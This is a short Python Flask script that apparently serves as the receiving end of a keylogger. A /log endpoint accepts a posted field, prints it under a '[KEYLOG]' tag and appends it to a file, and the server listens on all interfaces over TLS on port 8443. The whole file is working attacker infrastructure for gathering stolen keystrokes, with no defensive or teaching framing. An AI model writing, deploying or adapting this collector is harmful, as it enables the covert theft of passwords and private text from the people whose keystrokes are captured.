from flask import Flask, request
app = Flask(__name__)

@app.route("/log", methods=["POST"])
def receive_log():
    data = request.form.get("k", "")
    print(f"[KEYLOG] {data}")
    with open("logs.txt", "a") as f:
        f.write(data + "\n")
    return "OK", 200

app.run(host="0.0.0.0", port=8443, ssl_context="adhoc")